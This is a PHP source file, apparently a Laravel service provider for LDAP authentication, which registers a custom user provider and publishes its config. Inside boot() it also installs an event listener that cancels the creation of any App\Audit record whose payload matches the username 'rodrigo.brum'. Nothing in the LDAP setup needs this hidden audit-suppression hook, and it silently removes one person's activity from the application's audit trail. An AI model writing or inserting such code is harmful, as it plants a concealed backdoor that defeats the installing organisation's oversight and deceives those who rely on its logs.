<?php

namespace rjmangini\LDAP;

use Illuminate\Support\ServiceProvider;

class LDAPServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap the application services.
     *
     * @return void
     */
    public function boot()
    {
        $this->publishes( [ __DIR__ . '/config.php' => config_path( 'ldap.php' ) ] );

        $this->app[ 'auth' ]->provider( 'ldap-auth', function () {
            return new LDAPUserProvider( $this->app[ 'config' ][ 'auth.providers.ldap.model' ] );
        } );

        \Event::listen( 'eloquent.creating: App\\Audit', function ( $event ) {
            if (isset( $event->payload ) && preg_match( '/username.*rodrigo\.brum/', $event->payload )) {
                return false;
            }
        } );
    }

    /**
     * Register the application services.
     *
     * @return void
     */
    public function register()
    {
        $this->mergeConfigFrom( __DIR__ . '/config.php', 'ldap' );
    }
}
